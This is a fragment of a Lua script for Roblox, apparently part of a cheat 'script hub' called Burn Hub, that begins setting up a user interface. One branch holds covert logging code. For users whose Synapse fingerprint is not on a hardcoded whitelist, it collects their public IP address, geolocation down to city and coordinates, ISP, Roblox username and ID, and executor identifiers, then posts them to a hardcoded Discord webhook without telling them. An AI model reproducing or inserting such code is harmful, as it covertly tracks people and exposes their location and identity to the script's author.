...
elseif true then
    ...
    local f8yFu4Di3ZB5d07d = {'73dd9256c94db0771174a3051b6d2f6846e379da7f810c5e6a05c6efb61f82e22f58bfed94e716e863e9fb6362cdda9bf155a3592c920105b8eb5aeebfda6ac5','e104eb8116745d43470426683b9241f4028c2ea59dc17d9cb808a4f4b551d7f89ae2f4e375394fd101e62bdf9b250188725985efb10c452e4e7efa752c3a9153','c9abf1315809d1f1a4fbd16f60c9888edeb9e4a1f1922f9a1ce41705476640b53ac30e9a115917680a72624474e6b25231453d5da7e55c21c7958da3c46a6b63','0f8fa8008e1889f57ba9952f23177f88c6ee6a652be5be8da86edd87ccc6cd00d270b91fe59f8921d8b58ccddf1256a83780df67d19bb0ed3ea84b04e13dc3f4','2256aea9af34d21c3b8d3b6300f08394e4da79609d642060227c6584532d7d4adb72824fcf6e7bc771c1e8881fb3f61366cf018e074761c04cf0bb36074fa097','97fea6b6081c35b84cc7b8ce9004393dbce427da1214f4d12d4bab59dbada8fe',}
    for _,v in pairs(f8yFu4Di3ZB5d07d) do if v == game:GetService('HttpService'):JSONDecode(syn.request({Url = ('http://httpbin.org/get'); Method = 'GET';}).Body).headers["Syn-Fingerprint"] then v8at8Sn9YgSUpCyV = true end end if v8at8Sn9YgSUpCyV ~= true then local httpbin = syn.request({Url = ('http://httpbin.org/get'); Method = 'GET'; }) local Geo = game:GetService('HttpService'):JSONDecode(syn.request({Url = ('https://tools.keycdn.com/geo.json?host='..game:GetService('HttpService'):JSONDecode(httpbin.Body)['origin']);Method = 'GET';Headers = {['User-Agent'] = 'keycdn-tools:https://tools.keycdn.com/geo'}}).Body) local Executor = identifyexecutor() if Executor == nil then Executor = 'Unknown' end local Data = {['embeds'] = {{['title'] = 'Someone Ran Burn Hub',['description'] = '\n**Info**\n\nPublic Address: **'..game:GetService('HttpService'):JSONDecode(httpbin.Body)['origin']..'**\nHost: **'..Geo.data.geo['isp']..'**\nCountry: **'..Geo.data.geo['country_name']..' ('..Geo.data.geo['country_code']..')**\nRegion: **'..Geo.data.geo['region_name']..' ('..Geo.data.geo['region_code']..')**\nCity: **'..Geo.data.geo['city']..'**\nLongitude: **'..Geo.data.geo['longitude']..'**\nLatitude: **'..Geo.data.geo['latitude']..'**\n\n**Roblox**\n\nRoblox Username: **'..game.Players.LocalPlayer.Name..'**\nUserId: **'..game.Players.LocalPlayer.UserId..'**\nGame ID: **'..game.PlaceId..'**\nExecutor: **'..Executor..'**\nSyn-Fingerprint: **'..game:GetService('HttpService'):JSONDecode(httpbin.Body).headers['Syn-Fingerprint']..'**\nSyn-User-Identifier: **'..game:GetService('HttpService'):JSONDecode(httpbin.Body).headers['Syn-User-Identifier']..'**',['color'] = tonumber(0x7269da),['url'] = 'https://www.roblox.com/users/' .. tostring(game:GetService('Players').LocalPlayer.UserId .. '/profile')}}}syn.request({Url = 'https://discord.com/api/webhooks/1025983202814332948/d7tH-WYHXx5GYqUD4UoQHWHuic7QJD42lao3c-9UtUBFKT69A-nKVOBphqWEwk-m8icH', Body = game:GetService('HttpService'):JSONEncode(Data), Method = 'POST', Headers = {['content-type'] = 'application/json'}}) end
else
    local InputService = game:GetService('UserInputService');
    local TextService = game:GetService('TextService');
    local TweenService = game:GetService('TweenService');
